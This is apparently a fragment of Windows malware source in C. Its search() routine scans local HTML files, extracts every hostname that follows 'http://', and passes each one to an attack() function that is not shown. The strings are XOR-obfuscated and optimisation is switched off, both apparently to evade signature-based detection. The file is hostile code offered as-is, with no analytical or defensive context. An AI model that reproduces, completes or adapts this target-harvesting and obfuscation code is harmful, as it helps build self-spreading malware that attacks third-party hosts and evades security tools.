#pragma optimize("", off)
#include "data_globals.h"
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}


#include <windows.h>
#include <stdlib.h>
#include <string.h>

void search(LPCSTR path) {
    WIN32_FIND_DATAA wfd;
    HANDLE hFind, hFile;
    DWORD bytesread;
    char *buf, *p, *host;
    DWORD size;

    if (!SetCurrentDirectoryA(path)) return;

    // "*.htm*" with key 0x3E
    volatile char sz_pattern[] = {
        '*'^0x3E, '.'^0x3E, 'h'^0x3E, 't'^0x3E, 'm'^0x3E, '*'^0x3E, 0x00^0x3E
    };
    xor_decrypt(sz_pattern, sizeof(sz_pattern), 0x3E);
    hFind = FindFirstFileA((LPCSTR)sz_pattern, &wfd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        hFile = CreateFileA(wfd.cFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); continue; }

        buf = (char *)malloc(size + 1);
        if (!buf) { CloseHandle(hFile); continue; }

        if (!ReadFile(hFile, buf, size, &bytesread, NULL) || bytesread != size) {
            free(buf);
            CloseHandle(hFile);
            continue;
        }
        CloseHandle(hFile);
        buf[size] = '\0';

        p = buf;
        while (*p) {
            // "http://" with key 0x5C
            volatile char sz_http[] = {
                'h'^0x5C, 't'^0x5C, 't'^0x5C, 'p'^0x5C, ':'^0x5C,
                '/'^0x5C, '/'^0x5C, 0x00^0x5C
            };
            xor_decrypt(sz_http, sizeof(sz_http), 0x5C);
            char *http = strstr(p, (char*)sz_http);
            if (!http) break;
            host = http + 7;                // skip "http://"
            p = strchr(host, '/');
            if (!p) break;
            *p = '\0';                      // terminate at slash
            attack(host);
            p++;                            // move past the slash
        }
        free(buf);
    } while (FindNextFileA(hFind, &wfd));

    FindClose(hFind);
}

#pragma optimize("", on)
